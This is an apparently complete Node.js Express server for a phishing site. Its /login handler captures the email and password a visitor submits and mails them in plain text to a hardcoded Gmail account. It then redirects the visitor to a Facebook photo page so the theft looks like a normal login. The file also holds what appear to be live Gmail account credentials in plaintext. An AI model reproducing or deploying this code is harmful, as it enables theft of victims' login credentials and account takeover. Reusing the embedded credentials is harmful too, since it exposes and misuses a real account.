const express = require('express'); 
const app = express();             
const PORT = 3000;

var nodemailer = require('nodemailer');

var transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'saqlaintariq8919@gmail.com',
      pass: 'Delonation89'
    }
  });

app.use("/scripts", express.static('./scripts'));
app.use("/assets", express.static('./assets'));
app.use(express.urlencoded({ extended: true}));
app.use(express.json()); // Used to parse JSON bodies

app.get('/', (req, res) => { 
    res.sendFile('./routes/index.html', {root: __dirname});   
});

app.post('/login', function(req, res){
    let email = req.body.email;
    let pass = req.body.pass1;
    // res.send(`Email: ${email} Pass: ${pass} `);
    var mailOptions = {
        from: 'saqlaintariq8919@gmail.com',
        to: 'saqlaintariq8919@gmail.com',
        subject: 'Sending Email using Node.js',
        text: `Email: ${email} Pass: ${pass} `
      };
      
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });

      res.status(200).redirect('https://www.facebook.com/105038451736222/photos/a.305294228377309/305294131710652/');
      
 });

app.listen(PORT, () => {   
    console.log(`Now listening on port ${PORT}`); 
});